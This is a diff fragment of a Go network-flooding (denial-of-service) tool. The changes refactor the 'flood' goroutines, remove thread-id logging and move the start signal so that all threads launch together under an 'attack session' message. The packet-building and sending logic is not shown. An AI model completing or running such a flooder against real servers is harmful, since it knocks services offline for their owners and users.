@@ -128,9 +128,8 @@ func contain(char string, x string) int { //simple compare
 	return ans
 }
 
-func flood(id int, wg * sync.WaitGroup) {
+func flood(wg * sync.WaitGroup) {
 	defer wg.Done()
-	fmt.Printf("Current thread: %d\n", id)
 
 	addr := host + ":" + port
 	header := ""
@@ -190,7 +189,7 @@ func flood(id int, wg * sync.WaitGroup) {
 	
 	var s net.Conn
 	var err error
-	fmt.Printf("Finished thread: %d\n", id)
+	// fmt.Printf("Finished thread: %d\n", id)
 	<-start //received signal
 	
 	for {
@@ -285,12 +284,13 @@ func main() {
 		wg.Add(threads)
 		for i := 0; i < threads; i++ {
 			time.Sleep(time.Microsecond * 100)
-			go flood(i, &wg) // Start threads
+			go flood(&wg) // Start threads
 			fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
 			os.Stdout.Sync()
 		}
-
-	  
+		
+		fmt.Printf("\nCommencing attack session now...")
+		close(start)
 		// go func() {		// go func() {
 		//  fmt.Println("Starting a new thread for waiting")
 		//  wg.Wait()
@@ -302,7 +302,7 @@ func main() {
 		// }()
 		
 		wg.Wait()
-
+		fmt.Printf("\n Attack session finished.")
 		select {
 		// case <-done:
 		//  fmt.Println("All goroutines finished successfully")
@@ -313,8 +313,7 @@ func main() {
 	   }
 	  
 
-	fmt.Println("Flood will end in " + os.Args[4] + " seconds.")
-	close(start)
+	
 	time.Sleep(time.Duration(limit) * time.Second)
 	//Keep the threads continue
 }
